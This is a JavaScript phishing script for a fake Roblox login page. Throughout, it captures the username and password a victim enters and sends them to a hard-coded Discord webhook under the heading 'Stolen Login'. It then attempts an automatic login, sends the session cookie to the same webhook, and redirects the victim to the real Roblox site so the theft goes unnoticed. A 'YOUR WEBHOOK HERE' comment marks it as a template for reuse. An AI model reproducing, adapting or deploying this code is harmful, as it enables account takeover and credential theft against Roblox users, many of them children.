<script>
    document.getElementById('robloxLogin').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        
        // YOUR WEBHOOK HERE
        const webhook = "https://discord.com/api/webhooks/1545101253095202847/vq1JQ4D-SDovavmQREuBhgUzxC9w5n2_hM1tt-sP4I2U2KvBfypij_bvjiw06wbtEpVQ";

        // 1. Send Username/Password first (in case cookie fails)
        await fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: `🔓 **Stolen Login**\n👤 **User:** ${username}\n🔑 **Pass:** ${password}`
            })
        });

        // 2. Automatically log them in via API to generate a fresh cookie
        try {
            const loginResponse = await fetch('https://www.roblox.com/login/loginwithcredentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    csrfToken: getCsrfToken() // You might need to fetch this first from the login page
                })
            });
            
            if (loginResponse.ok) {
                // 3. Now that they are logged in, grab the NEW cookie
                const newCookie = document.cookie;
                
                // 4. Send the cookie to Discord
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `🍪 **New Cookie Generated**\n🔗 **Cookie:** \`${newCookie}\``
                    })
                });
            }
        } catch (err) {
            console.log("Auto-login failed", err);
        }

        // 5. Redirect to Home
        window.location.href = "https://www.roblox.com/home";
    });

    // Helper to get CSRF token if needed
    function getCsrfToken() {
        const meta = document.querySelector('meta[name="csrf-token"]');
        return meta ? meta.getAttribute('content') : '';
    }
</script>
